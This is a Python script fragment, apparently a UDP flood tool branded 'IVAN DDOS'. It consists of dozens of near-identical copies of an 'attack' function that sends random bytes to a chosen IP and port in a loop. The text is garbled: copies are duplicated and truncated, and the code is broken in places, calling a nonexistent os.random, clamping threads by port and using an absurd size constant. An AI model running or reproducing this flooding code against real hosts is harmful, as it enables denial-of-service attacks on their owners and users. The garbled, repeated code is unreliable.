        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
